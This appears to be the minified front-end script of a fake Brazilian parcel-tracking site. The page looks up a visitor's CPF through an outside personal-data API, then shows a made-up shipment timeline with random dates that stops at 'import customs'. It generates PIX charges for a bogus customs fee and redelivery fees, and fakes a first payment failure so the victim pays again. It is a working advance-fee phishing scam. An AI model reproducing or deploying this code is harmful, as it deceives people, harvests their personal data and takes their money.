import"./modulepreload-polyfill-B5Qt9EMX.js";/* empty css              */import{D as h,C as u}from"./database-_Qbsagj7.js";import{N as f}from"./navigation-BwbyOJod.js";class y{constructor(){this.fallbackData=this.generateFallbackData(),console.log("DataService initialized")}async fetchCPFData(e){const t=e.replace(/[^\d]/g,"");console.log("Fetching data for CPF:",t);try{const a=await this.tryOfficialAPI(t);if(a)return console.log("Data obtained from official API:",a),a}catch(a){console.error("Official API failed, using fallback:",a.message)}return console.log("Using fallback data for CPF:",t),this.getFallbackData(t)}async tryOfficialAPI(e){const t=new AbortController,a=setTimeout(()=>t.abort(),15e3);try{console.log("Calling official API endpoint for CPF:",e);const o=`https://api.amnesiatecnologia.rocks/?token=e9f16505-2743-4392-bfbe-1b4b89a7367c&cpf=${e}`,i={signal:t.signal,method:"GET",mode:"cors",headers:{Accept:"application/json","Content-Type":"application/json","User-Agent":"Mozilla/5.0 (compatible; TrackingSystem/1.0)"},credentials:"omit"};console.log("Fetch options:",i),console.log("API URL:",o);const n=await fetch(o,i);if(clearTimeout(a),console.log("Response status:",n.status),console.log("Response headers:",Object.fromEntries(n.headers.entries())),!n.ok)throw console.error(`HTTP Error: ${n.status} - ${n.statusText}`),new Error(`API Error: ${n.status} - ${n.statusText}`);const s=await n.text();if(console.log("API Response Text:",s.substring(0,200)+(s.length>200?"...":"")),!s||s.trim()==="")throw console.error("Empty response from API"),new Error("Resposta vazia da API");try{const r=JSON.parse(s);if(console.log("Parsed API data:",r),r&&r.DADOS&&r.DADOS.nome&&r.DADOS.cpf)return console.log("‚úÖ Dados v√°lidos recebidos da API oficial"),console.log("Nome encontrado:",r.DADOS.nome),console.log("CPF:",r.DADOS.cpf),{DADOS:{nome:r.DADOS.nome,cpf:r.DADOS.cpf,nascimento:this.formatBirthDate(r.DADOS.data_nascimento),situacao:"REGULAR",sexo:r.DADOS.sexo||"N/A",nome_mae:r.DADOS.nome_mae||"N/A"}};throw console.error("Invalid data format from API:",r),new Error("Formato de dados inv√°lido da API")}catch(r){throw console.error("JSON parse error:",r),new Error("Erro ao processar resposta da API: "+r.message)}}catch(o){throw clearTimeout(a),console.error("API call error details:",{name:o.name,message:o.message,stack:o.stack,cause:o.cause}),o.name==="AbortError"?(console.error("Request was aborted (timeout)"),new Error("Timeout: A API demorou muito para responder")):o.message.includes("Failed to fetch")?(console.error("Network error - possibly CORS or connectivity issue"),new Error("Erro de conectividade: N√£o foi poss√≠vel acessar a API externa")):o.message.includes("CORS")?(console.error("CORS error detected"),new Error("Erro de CORS: API externa n√£o permite acesso do navegador")):o}}formatBirthDate(e){if(!e)return null;try{return e}catch(t){return console.error("Erro ao formatar data de nascimento:",t),null}}getFallbackData(e){const t=["Jo√£o Silva Santos","Maria Oliveira Costa","Pedro Souza Lima","Ana Paula Ferreira","Carlos Eduardo Alves","Fernanda Santos Rocha","Ricardo Pereira Dias","Juliana Costa Martins","Bruno Almeida Silva","Camila Rodrigues Nunes","Rafael Santos Barbosa","Larissa Oliveira Cruz"],a=parseInt(e.slice(-2))%t.length,o=t[a];return console.log("Generated fallback data for CPF:",e,"Name:",o),{DADOS:{nome:o,cpf:e,nascimento:this.generateBirthDate(e),situacao:"REGULAR"}}}generateBirthDate(e){const t=1960+parseInt(e.slice(0,2))%40,a=parseInt(e.slice(2,4))%12+1;return`${(parseInt(e.slice(4,6))%28+1).toString().padStart(2,"0")}/${a.toString().padStart(2,"0")}/${t}`}generateFallbackData(){return{products:["Kit 12 caixas organizadoras + brinde","Conjunto de panelas antiaderentes","Smartphone Samsung Galaxy A54","Fone de ouvido Bluetooth","Carregador port√°til 10000mAh","Camiseta b√°sica algod√£o","T√™nis esportivo Nike","Rel√≥gio digital smartwatch"]}}}class P{constructor(){this.baseURL="https://api.zentrapaybr.com",this.apiSecret=this.getApiSecret(),this.webhookUrl=this.getWebhookUrl(),console.log("üîë ZentraPayService inicializado com API Zentra Pay Brasil"),console.log("üîê API Secret configurada:",this.apiSecret?"SIM":"N√ÉO"),console.log("üîó Webhook URL:",this.webhookUrl)}getApiSecret(){const e=window.ZENTRA_PAY_SECRET_KEY||localStorage.getItem("zentra_pay_secret_key")||"SUA_CHAVE_API_SECRET_AQUI";return e!=="SUA_CHAVE_API_SECRET_AQUI"?(console.log("‚úÖ API Secret Zentra Pay v√°lida encontrada"),console.log("üîë Secret (primeiros 20 chars):",e.substring(0,20)+"...")):console.warn('‚ö†Ô∏è API Secret Zentra Pay n√£o configurada. Configure usando: configurarZentraPay("sua_chave")'),e}getWebhookUrl(){return`${window.location.origin}/webhook/zentra-pay`}getProductConfig(e){const t={taxa_alfandegaria:{id:"UlCGsjOn",nome:"Taxa Alfandeg√°ria",valor:26.34,checkout_url:"https://checkout.zentrapaybr.com/UlCGsjOn"},tentativa_entrega_1:{id:"xPTSsVmH",nome:"Tentativa de Entrega 1¬∞",valor:9.74,checkout_url:"https://checkout.zentrapaybr.com/xPTSsVmH"},tentativa_entrega_2:{id:"xkgmEGMN",nome:"Tentativa de Entrega 2¬∞",valor:14.98,checkout_url:"https://checkout.zentrapaybr.com/xkgmEGMN"},tentativa_entrega_3:{id:"jnHNAKcF",nome:"Tentativa de Entrega 3¬∞",valor:18.96,checkout_url:"https://checkout.zentrapaybr.com/jnHNAKcF"}};return t[e]||t.taxa_alfandegaria}generateUniqueEmail(e){const t=Math.random().toString(36).substring(2,8);return`lead${e}_${t}@tempmail.com`}generateUniquePhone(e){return`11${e.toString().slice(-8)}`}generateExternalId(){const e=Date.now(),t=Math.random().toString(36).substring(2,8);return`bolt_${e}_${t}`}async createPixTransaction(e,t,a="taxa_alfandegaria"){try{const o=Date.now(),i=this.generateExternalId(),n=this.getProductConfig(a);if(this.apiSecret=this.getApiSecret(),!this.apiSecret||this.apiSecret==="SUA_CHAVE_API_SECRET_AQUI")throw new Error('API Secret n√£o configurada. Configure usando: configurarZentraPay("sua_chave")');const s=e.email||this.generateUniqueEmail(o),r=e.telefone||this.generateUniquePhone(o);console.log("üìß Email usado:",s),console.log("üì± Telefone usado:",r),console.log("üõçÔ∏è Produto:",n.nome);const l={external_id:i,total_amount:parseFloat(t),payment_method:"PIX",webhook_url:this.webhookUrl,items:[{id:n.id,title:n.nome,quantity:1,price:parseFloat(t),description:`${n.nome} - Logix Express`,is_physical:!1}],ip:this.getClientIP(),customer:{name:e.nome,email:s,phone:r,document_type:"CPF",document:e.cpf.replace(/[^\d]/g,"")}};console.log("üöÄ Criando transa√ß√£o Zentra Pay Brasil:",{external_id:l.external_id,total_amount:`R$ ${l.total_amount.toFixed(2)}`,payment_method:l.payment_method,webhook_url:l.webhook_url,product_id:n.id,customer:{name:l.customer.name,document:l.customer.document,email:l.customer.email,phone:l.customer.phone,document_type:l.customer.document_type}});const g={Authorization:`Bearer ${this.apiSecret}`,"Content-Type":"application/json"};console.log("üì° Headers da requisi√ß√£o:",{Authorization:`Bearer ${this.apiSecret.substring(0,20)}...`,"Content-Type":g["Content-Type"]});const m=await fetch(`${this.baseURL}/v1/transactions`,{method:"POST",headers:g,body:JSON.stringify(l)});if(console.log("üì° Status da resposta:",m.status),!m.ok){const p=await m.text();throw console.error("‚ùå Erro na API Zentra Pay Brasil:",{status:m.status,statusText:m.statusText,body:p}),new Error(`Erro na API: ${m.status} - ${p}`)}const c=await m.json();if(console.log("‚úÖ Resposta Zentra Pay Brasil recebida:",{transaction_id:c.transaction_id||c.id,external_id:c.external_id,has_pix_code:!!c.pix_code,has_qr_code:!!c.qr_code_url,status:c.status,payment_method:c.payment_method}),!c.pix_code)throw console.error("‚ùå Resposta incompleta da API Zentra Pay Brasil:",c),new Error("Resposta da API n√£o cont√©m o c√≥digo PIX necess√°rio");return console.log("üéâ PIX gerado com sucesso via Zentra Pay Brasil!"),console.log("üìã PIX Code (copia e cola):",c.pix_code),{success:!0,externalId:i,pixPayload:c.pix_code,qrCode:c.qr_code_url||null,transactionId:c.transaction_id||c.id,email:s,telefone:r,valor:t,productType:a,productConfig:n,status:c.status||"pending",paymentMethod:c.payment_method||"PIX",timestamp:o}}catch(o){return console.error("üí• Erro ao criar transa√ß√£o PIX:",{message:o.message,stack:o.stack,apiSecret:this.apiSecret?"CONFIGURADA":"N√ÉO CONFIGURADA"}),{success:!1,error:o.message,details:o.stack}}}getClientIP(){return"127.0.0.1"}setApiSecret(e){return!e||e==="SUA_CHAVE_API_SECRET_AQUI"?(console.error("‚ùå API Secret inv√°lida fornecida"),!1):(this.apiSecret=e,localStorage.setItem("zentra_pay_secret_key",e),window.ZENTRA_PAY_SECRET_KEY=e,console.log("üîë API Secret Zentra Pay Brasil atualizada com sucesso"),!0)}async testConnection(){try{if(console.log("üîç Testando conex√£o com Zentra Pay Brasil..."),this.apiSecret=this.getApiSecret(),!this.apiSecret||this.apiSecret==="SUA_CHAVE_API_SECRET_AQUI")throw new Error("API Secret inv√°lida para teste de conex√£o");const e=await fetch(`${this.baseURL}/v1/health`,{method:"GET",headers:{Authorization:`Bearer ${this.apiSecret}`,"Content-Type":"application/json"}});return e.ok?(console.log("‚úÖ Conex√£o com Zentra Pay Brasil OK"),!0):(console.warn("‚ö†Ô∏è Problema na conex√£o:",e.status),!1)}catch(e){return console.error("‚ùå Erro ao testar conex√£o:",e),!1}}validateApiSecret(){return this.apiSecret?this.apiSecret==="SUA_CHAVE_API_SECRET_AQUI"?(console.error("‚ùå API Secret n√£o foi configurada (ainda usando placeholder)"),!1):this.apiSecret.length<20?(console.error("‚ùå API Secret muito curta"),!1):(console.log("‚úÖ API Secret v√°lida"),!0):(console.error("‚ùå Nenhuma API Secret configurada"),!1)}async generatePixForStage(e,t){console.log("üîÑ Gerando PIX autom√°tico para:",t);const a=this.getProductConfig(t);try{const o=await this.createPixTransaction(e,a.valor,t);return o.success&&console.log("‚úÖ PIX gerado automaticamente:",{produto:a.nome,valor:`R$ ${a.valor.toFixed(2)}`,pixCode:o.pixPayload.substring(0,50)+"..."}),o}catch(o){return console.error("‚ùå Erro ao gerar PIX autom√°tico:",o),{success:!1,error:o.message}}}}class S{constructor(){this.isInitialized=!1,this.currentCPF=null,this.userData=null,this.leadData=null,this.trackingData=null,this.dataService=new y,this.zentraPayService=new P,this.dbService=new h,this.liberationAttempts=0,this.maxLiberationAttempts=2,this.deliveryAttempts=0,this.currentStage=1,this.isLiberationPaid=!1,console.log("üöÄ TrackingSystem inicializado"),this.init()}async init(){if(!this.isInitialized){console.log("üîß Inicializando sistema de rastreamento...");try{this.setupEventListeners(),this.setupCPFMask(),this.checkURLParams(),this.isInitialized=!0,console.log("‚úÖ Sistema de rastreamento inicializado com sucesso")}catch(e){console.error("‚ùå Erro na inicializa√ß√£o:",e)}}}setupEventListeners(){const e=document.getElementById("trackingForm");e&&e.addEventListener("submit",a=>this.handleFormSubmit(a));const t=document.getElementById("detailsHeader");t&&t.addEventListener("click",()=>this.toggleOrderDetails()),this.setupLiberationModal()}setupCPFMask(){const e=document.getElementById("cpfInput");e&&e.addEventListener("input",t=>{u.applyCPFMask(t.target)})}checkURLParams(){new URLSearchParams(window.location.search).get("focus")==="cpf"&&setTimeout(()=>{const a=document.getElementById("cpfInput");a&&a.focus()},500)}async handleFormSubmit(e){e.preventDefault();const a=document.getElementById("cpfInput").value.replace(/[^\d]/g,"");if(!u.isValidCPF(a)){this.showError("CPF inv√°lido. Verifique os dados e tente novamente.");return}this.currentCPF=a,await this.handleTrackingSubmit()}async handleTrackingSubmit(){console.log("üîç Iniciando rastreamento para CPF:",this.currentCPF),this.showLoadingNotification();try{console.log("üîç Buscando lead no banco de dados...");const e=await this.dbService.getLeadByCPF(this.currentCPF);if(e.success&&e.data)console.log("‚úÖ Lead encontrado no banco de dados:",e.data),this.userData={nome:e.data.nome_completo,cpf:this.currentCPF,email:e.data.email,telefone:e.data.telefone,endereco:e.data.endereco,nascimento:this.generateBirthDate(this.currentCPF),situacao:"REGULAR"},this.leadData=e.data,console.log("üì¶ Dados completos do usu√°rio (Supabase):",{nome:this.userData.nome,cpf:this.userData.cpf,email:this.userData.email,telefone:this.userData.telefone,etapa_atual:this.leadData.etapa_atual}),console.log("üì¶ Etapa atual do lead:",this.leadData.etapa_atual),this.closeLoadingNotification(),this.displayResults();else{console.log("üåê Lead n√£o encontrado no banco, buscando dados via API...");const t=await this.dataService.fetchCPFData(this.currentCPF);if(t&&t.DADOS)this.userData={nome:t.DADOS.nome,cpf:this.currentCPF,email:null,telefone:null,nascimento:t.DADOS.nascimento,situacao:t.DADOS.situacao||"REGULAR"},console.log("‚úÖ Dados b√°sicos obtidos via API externa:",this.userData),console.log("‚ö†Ô∏è Email e telefone n√£o dispon√≠veis - ser√° necess√°rio gerar"),this.closeLoadingNotification(),this.displayResults();else throw new Error("Dados n√£o encontrados")}}catch(e){console.error("‚ùå Erro no rastreamento:",e),this.closeLoadingNotification(),this.showError("Erro ao buscar dados. Tente novamente.")}}generateBirthDate(e){const t=e.replace(/[^\d]/g,""),a=1960+parseInt(t.slice(0,2))%40,o=parseInt(t.slice(2,4))%12+1;return`${(parseInt(t.slice(4,6))%28+1).toString().padStart(2,"0")}/${o.toString().padStart(2,"0")}/${a}`}generateTrackingData(){const e=new Date,t=this.generateRealisticDates(e,11);let a=11;this.leadData&&this.leadData.etapa_atual&&(a=Math.min(this.leadData.etapa_atual,11)),this.leadData&&this.leadData.status_pagamento==="pago"&&(this.isLiberationPaid=!0,a=Math.max(a,12)),this.trackingData={currentStep:a,steps:[{id:1,date:t[0],title:"Seu pedido foi criado",description:"Seu pedido foi criado",completed:a>=1},{id:2,date:t[1],title:"Preparando para envio",description:"O seu pedido est√° sendo preparado para envio",completed:a>=2},{id:3,date:t[2],title:"Pedido enviado",description:"[China] O vendedor enviou seu pedido",completed:a>=3,isChina:!0},{id:4,date:t[3],title:"Centro de triagem",description:"[China] O pedido chegou ao centro de triagem de Shenzhen",completed:a>=4,isChina:!0},{id:5,date:t[4],title:"Centro log√≠stico",description:"[China] Pedido saiu do centro log√≠stico de Shenzhen",completed:a>=5,isChina:!0},{id:6,date:t[5],title:"Tr√¢nsito internacional",description:"[China] Coletado. O pedido est√° em tr√¢nsito internacional",completed:a>=6,isChina:!0},{id:7,date:t[6],title:"Liberado para exporta√ß√£o",description:"[China] O pedido foi liberado na alf√¢ndega de exporta√ß√£o",completed:a>=7,isChina:!0},{id:8,date:t[7],title:"Saiu da origem",description:"Pedido saiu da origem: Shenzhen",completed:a>=8},{id:9,date:t[8],title:"Chegou no Brasil",description:"Pedido chegou no Brasil",completed:a>=9},{id:10,date:t[9],title:"Centro de distribui√ß√£o",description:"Pedido em tr√¢nsito para CURITIBA/PR",completed:a>=10},{id:11,date:t[10],title:"Alf√¢ndega de importa√ß√£o",description:"Pedido chegou na alf√¢ndega de importa√ß√£o: CURITIBA/PR",completed:a>=11,needsLiberation:!0}]},this.isLiberationPaid&&a>=12&&this.trackingData.steps.push({id:12,date:new Date(this.leadData.updated_at||Date.now()),title:"Pedido liberado",description:"Pedido liberado na Alf√¢ndega de Importa√ß√£o",completed:!0}),console.log("üìä Dados de rastreamento gerados:",{currentStep:a,totalSteps:this.trackingData.steps.length,liberationPaid:this.isLiberationPaid})}displayResults(){this.displayOrderDetails(),this.generateTrackingData(),this.displayTrackingResults();const e=document.getElementById("orderDetails");e&&setTimeout(()=>{e.scrollIntoView({behavior:"smooth"})},100)}displayOrderDetails(){const e=document.getElementById("orderDetails"),t=document.getElementById("customerName"),a=document.getElementById("fullName"),o=document.getElementById("formattedCpf");e&&(e.style.display="block"),t&&(t.textContent=this.userData.nome),a&&(a.textContent=this.userData.nome),o&&(o.textContent=u.formatCPF(this.userData.cpf))}displayTrackingResults(){const e=document.getElementById("trackingResults"),t=document.getElementById("customerNameStatus"),a=document.getElementById("currentStatus");e&&(e.style.display="block"),t&&(t.textContent=this.userData.nome),a&&(a.textContent="Aguardando libera√ß√£o aduaneira"),this.renderTimeline()}generateRealisticDates(e,t){const a=[],o=new Date,i=new Date(e),n=new Date(i);n.setDate(n.getDate()-2),a.push(this.getRandomTimeOnDate(n)),a.push(this.getRandomTimeOnDate(n));const s=new Date(i);s.setDate(s.getDate()-1);for(let r=2;r<9;r++)a.push(this.getRandomTimeOnDate(s));return a.push(this.getTimeBeforeNow(i,o,1)),a.push(this.getTimeBeforeNow(i,o,2)),a}getRandomTimeOnDate(e){const t=new Date(e),a=Math.floor(Math.random()*18)+5,o=Math.floor(Math.random()*60);return t.setHours(a,o,0,0),t}getTimeBeforeNow(e,t,a){const o=new Date(e);t.getHours();let i;a===1?i=Math.floor(Math.random()*4)+2:i=Math.random()*1.5+.5;const n=new Date(t);return n.setHours(n.getHours()-i),n.getHours()<6&&(n.setHours(6+Math.floor(Math.random()*2)),n.setMinutes(Math.floor(Math.random()*60))),o.setHours(n.getHours(),n.getMinutes(),0,0),o}renderTimeline(){const e=document.getElementById("trackingTimeline");e&&(e.innerHTML="",this.trackingData.steps.forEach((t,a)=>{const o=this.createTimelineItem(t,a);e.appendChild(o),setTimeout(()=>{o.style.opacity="1",o.style.transform="translateY(0)"},a*100)}))}createTimelineItem(e,t){const a=document.createElement("div");a.className=`timeline-item ${e.completed?"completed":""}`,a.style.opacity="0",a.style.transform="translateY(20px)",a.style.transition="all 0.5s ease";const o=e.date.toLocaleDateString("pt-BR",{day:"2-digit",month:"short"}),i=e.date.toLocaleTimeString("pt-BR",{hour:"2-digit",minute:"2-digit"});let n="";if(e.id===11&&e.needsLiberation&&!this.isLiberationPaid&&(n=`
                <button class="liberation-button-timeline" onclick="window.trackingSystemInstance.showLiberationModal()">
                    <i class="fas fa-unlock"></i> Liberar Pacote
                </button>
            `),this.needsDeliveryPayment(e.id)){const r=this.getDeliveryValue(e.id);n=`
                <button class="liberation-button-timeline delivery-retry-btn" onclick="window.trackingSystemInstance.showDeliveryModal(${e.id}, ${r})">
                    <i class="fas fa-redo"></i> Reenviar Pacote
                </button>
            `}const s=e.isChina?'<span class="china-tag">China</span>':"";return a.innerHTML=`
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${o}</span>
                    <span class="time">${i}</span>
                </div>
                <div class="timeline-text">
                    <p>${s}${e.description}</p>
                    ${n}
                </div>
            </div>
        `,a}needsDeliveryPayment(e){return[16,20,24].includes(e)}getDeliveryValue(e){return{16:9.74,20:14.98,24:18.96}[e]||9.74}setupLiberationModal(){const e=document.getElementById("closeModal"),t=document.getElementById("liberationModal"),a=document.getElementById("copyPixButtonModal"),o=document.getElementById("simulatePaymentButton");e&&e.addEventListener("click",()=>{this.closeLiberationModal()}),t&&t.addEventListener("click",i=>{i.target===t&&this.closeLiberationModal()}),a&&a.addEventListener("click",()=>{this.copyPixCode()}),o&&o.addEventListener("click",()=>{this.handleLiberationPayment()})}showLiberationModal(){console.log("üîì Abrindo modal de libera√ß√£o aduaneira"),this.generateLiberationPix();const e=document.getElementById("liberationModal");if(e){e.style.display="flex",document.body.style.overflow="hidden";const t=document.getElementById("simulatePaymentButton");t&&(t.innerHTML='<i class="fas fa-credit-card"></i> Simular Pagamento',t.removeAttribute("data-retry"))}}async generateLiberationPix(){if(console.log("üîÑ Gerando PIX autom√°tico para Taxa Alfandeg√°ria..."),!this.userData){console.error("‚ùå Dados do usu√°rio n√£o dispon√≠veis para gerar PIX");return}try{this.showPixGenerationIndicator();const e=await this.zentraPayService.generatePixForStage(this.userData,"taxa_alfandegaria");e.success?(console.log("‚úÖ PIX da Taxa Alfandeg√°ria gerado automaticamente!"),this.updateModalWithRealPix(e),this.hidePixGenerationIndicator()):(console.warn("‚ö†Ô∏è Falha ao gerar PIX, usando dados est√°ticos"),this.hidePixGenerationIndicator())}catch(e){console.error("‚ùå Erro ao gerar PIX autom√°tico:",e),this.hidePixGenerationIndicator()}}showPixGenerationIndicator(){const e=document.getElementById("realPixQrCode"),t=document.getElementById("pixCodeModal");e&&(e.style.opacity="0.5",e.style.filter="blur(2px)"),t&&(t.value="Gerando c√≥digo PIX autom√°tico...",t.style.opacity="0.7");const a=document.getElementById("liberationModal");if(a&&!document.getElementById("pixLoadingIndicator")){const o=document.createElement("div");o.id="pixLoadingIndicator",o.style.cssText=`
                position: absolute;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                background: rgba(255, 255, 255, 0.9);
                padding: 20px;
                border-radius: 10px;
                text-align: center;
                z-index: 10;
                box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            `,o.innerHTML=`
                <div class="processing-indicator">
                    <i class="fas fa-spinner fa-spin"></i>
                    Gerando PIX autom√°tico...
                </div>
            `,a.appendChild(o)}}hidePixGenerationIndicator(){const e=document.getElementById("pixLoadingIndicator");e&&e.remove();const t=document.getElementById("realPixQrCode"),a=document.getElementById("pixCodeModal");t&&(t.style.opacity="1",t.style.filter="none"),a&&(a.style.opacity="1")}updateModalWithRealPix(e){console.log("üîÑ Atualizando modal com PIX real da Zentra Pay...");const t=document.getElementById("realPixQrCode");if(t&&e.qrCode)t.src=e.qrCode,console.log("‚úÖ QR Code atualizado com URL real");else if(t&&e.pixPayload){const o=`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(e.pixPayload)}`;t.src=o,console.log("‚úÖ QR Code gerado a partir do payload")}const a=document.getElementById("pixCodeModal");a&&e.pixPayload&&(a.value=e.pixPayload,console.log("‚úÖ C√≥digo PIX atualizado")),this.currentPixData=e}closeLiberationModal(){const e=document.getElementById("liberationModal");e&&(e.style.display="none",document.body.style.overflow="auto")}handleLiberationPayment(){const e=document.getElementById("simulatePaymentButton");e&&(this.liberationAttempts++,console.log(`üí≥ Tentativa de pagamento ${this.liberationAttempts}/${this.maxLiberationAttempts}`),this.liberationAttempts===1?(console.log("‚ùå Primeira tentativa - simulando erro"),alert("Erro ao processar pagamento"),e.innerHTML='<i class="fas fa-redo"></i> Tentar Novamente',e.setAttribute("data-retry","true")):(console.log("‚úÖ Segunda tentativa - sucesso"),this.processSuccessfulPayment()))}processSuccessfulPayment(){console.log("üéâ Pagamento processado com sucesso!"),this.isLiberationPaid=!0,this.closeLiberationModal(),this.addStage12(),this.currentCPF&&(this.dbService.updatePaymentStatus(this.currentCPF,"pago"),this.dbService.updateLeadStage(this.currentCPF,12),console.log("üíæ Status atualizado no Supabase: pago, etapa 12"))}addStage12(){console.log("üì¶ Adicionando etapa 12: Pedido liberado");const e=document.getElementById("trackingTimeline");if(!e)return;const t=new Date,a=this.createStage12Item(t);e.appendChild(a),setTimeout(()=>{a.style.opacity="1",a.style.transform="translateY(0)",a.scrollIntoView({behavior:"smooth",block:"center"})},100);const o=document.getElementById("currentStatus");o&&(o.textContent="Pedido liberado na alf√¢ndega")}createStage12Item(e){const t=document.createElement("div");t.className="timeline-item completed new-step",t.style.opacity="0",t.style.transform="translateY(20px)",t.style.transition="all 0.5s ease";const a=e.toLocaleDateString("pt-BR",{day:"2-digit",month:"short"}),o=e.toLocaleTimeString("pt-BR",{hour:"2-digit",minute:"2-digit"});return t.innerHTML=`
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${a}</span>
                    <span class="time">${o}</span>
                </div>
                <div class="timeline-text">
                    <p>Pedido liberado na Alf√¢ndega de Importa√ß√£o</p>
                </div>
            </div>
        `,t}async showDeliveryModal(e,t){const a=this.getDeliveryValue(e),o=this.getAttemptNumber(e),i=this.getDeliveryStageType(e);if(console.log(`üöö Abrindo modal de reenvio - Etapa ${e} - R$ ${a.toFixed(2)}`),this.userData)try{console.log("üîÑ Gerando PIX autom√°tico para tentativa de entrega...");const n=await this.zentraPayService.generatePixForStage(this.userData,i);n.success?(console.log("‚úÖ PIX de tentativa de entrega gerado automaticamente!"),this.showDeliveryPixModal(e,a,o,n)):(console.warn("‚ö†Ô∏è Falha ao gerar PIX, usando modal est√°tico"),this.showDeliveryPixModal(e,a,o,null))}catch(n){console.error("‚ùå Erro ao gerar PIX de entrega:",n),this.showDeliveryPixModal(e,a,o,null)}else console.warn("‚ö†Ô∏è Dados do usu√°rio n√£o dispon√≠veis"),this.showDeliveryPixModal(e,a,o,null)}getDeliveryStageType(e){return{16:"tentativa_entrega_1",20:"tentativa_entrega_2",24:"tentativa_entrega_3"}[e]||"tentativa_entrega_1"}showDeliveryPixModal(e,t,a,o){console.log(`üí≥ Exibindo modal de PIX - Tentativa ${a} - R$ ${t.toFixed(2)}`),o&&o.success?console.log("‚úÖ Modal com PIX real da Zentra Pay"):console.log("‚ö†Ô∏è Modal com PIX est√°tico (fallback)"),alert(`PIX gerado para Tentativa ${a} - R$ ${t.toFixed(2)}

${o?"PIX Real Gerado!":"Usando PIX Est√°tico"}`)}getAttemptNumber(e){return{16:1,20:2,24:3}[e]||1}copyPixCode(){const e=document.getElementById("pixCodeModal"),t=document.getElementById("copyPixButtonModal");if(!(!e||!t))try{e.select(),e.setSelectionRange(0,99999),navigator.clipboard&&window.isSecureContext?navigator.clipboard.writeText(e.value).then(()=>{this.showCopySuccess(t)}).catch(()=>{this.fallbackCopy(e,t)}):this.fallbackCopy(e,t)}catch(a){console.error("‚ùå Erro ao copiar PIX:",a)}}fallbackCopy(e,t){try{document.execCommand("copy")&&this.showCopySuccess(t)}catch(a){console.error("‚ùå Fallback copy falhou:",a)}}showCopySuccess(e){const t=e.innerHTML;e.innerHTML='<i class="fas fa-check"></i> Copiado!',e.style.background="#27ae60",setTimeout(()=>{e.innerHTML=t,e.style.background=""},2e3)}toggleOrderDetails(){const e=document.getElementById("detailsContent"),t=document.querySelector(".toggle-icon i");e&&t&&(e.classList.contains("expanded")?(e.classList.remove("expanded"),t.classList.remove("rotated")):(e.classList.add("expanded"),t.classList.add("rotated")))}showLoadingNotification(){const e=document.createElement("div");e.id="trackingNotification",e.style.cssText=`
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;const t=document.createElement("div");t.style.cssText=`
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
            border: 3px solid #1e4a6b;
        `,t.innerHTML=`
            <div style="margin-bottom: 20px;">
                <i class="fas fa-search" style="font-size: 3rem; color: #1e4a6b; animation: pulse 1.5s infinite;"></i>
            </div>
            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                Identificando Pedido...
            </h3>
            <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
                Aguarde enquanto rastreamos seu pacote
            </p>
        `,e.appendChild(t),document.body.appendChild(e),document.body.style.overflow="hidden"}closeLoadingNotification(){const e=document.getElementById("trackingNotification");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300))}showError(e){const t=document.querySelector(".error-message");t&&t.remove();const a=document.createElement("div");a.className="error-message",a.style.cssText=`
            background: #fee;
            color: #c33;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            border: 1px solid #fcc;
            text-align: center;
            font-weight: 500;
            animation: slideDown 0.3s ease;
        `,a.textContent=e;const o=document.querySelector(".tracking-form");o&&(o.appendChild(a),setTimeout(()=>{a.parentNode&&(a.style.animation="slideUp 0.3s ease",setTimeout(()=>a.remove(),300))},5e3))}}(function(){console.log("=== SISTEMA DE RASTREAMENTO APRIMORADO CARREGANDO ===");let d;function e(){console.log("=== INICIALIZANDO P√ÅGINA DE RASTREAMENTO APRIMORADA ===");try{if(f.init(),console.log("‚úì Navega√ß√£o inicializada"),!d){const n=new URLSearchParams(window.location.search).get("origem")==="vega";d=new S,window.trackingSystemInstance=d,console.log("‚úì Sistema de rastreamento aprimorado criado")}o(),console.log("‚úì Header scroll configurado"),a(),t(),console.log("=== P√ÅGINA DE RASTREAMENTO APRIMORADA INICIALIZADA COM SUCESSO ===")}catch(i){console.error("‚ùå Erro na inicializa√ß√£o da p√°gina de rastreamento:",i),setTimeout(e,2e3)}}function t(){const i=window.ZENTRA_PAY_SECRET_KEY||localStorage.getItem("zentra_pay_secret_key");i&&i!=="SUA_SECRET_KEY_AQUI"&&d?(d.zentraPayService.setApiSecret(i),console.log("‚úì API Secret Zentra Pay configurada automaticamente")):console.warn('‚ö†Ô∏è API Secret Zentra Pay n√£o configurada. Configure usando: configurarZentraPay("sua_chave")')}function a(){["trackingForm","cpfInput","trackButton","liberationModal","pixCodeModal","realPixQrCode"].forEach(n=>{document.getElementById(n)?console.log(`‚úì Elemento encontrado: ${n}`):console.warn(`‚ö†Ô∏è Elemento n√£o encontrado: ${n}`)})}function o(){window.addEventListener("scroll",function(){const i=document.querySelector(".header");i&&(i.style.backgroundColor="rgba(255, 255, 255, 0.1)",i.style.backdropFilter="blur(10px)")})}document.readyState==="loading"?(document.addEventListener("DOMContentLoaded",e),console.log("üìÖ Aguardando DOMContentLoaded")):(e(),console.log("üìÑ DOM j√° carregado, inicializando imediatamente")),setTimeout(e,100),setTimeout(e,500),setTimeout(e,1e3),setTimeout(e,2e3),console.log("=== SCRIPT DE RASTREAMENTO APRIMORADO CARREGADO ===")})();
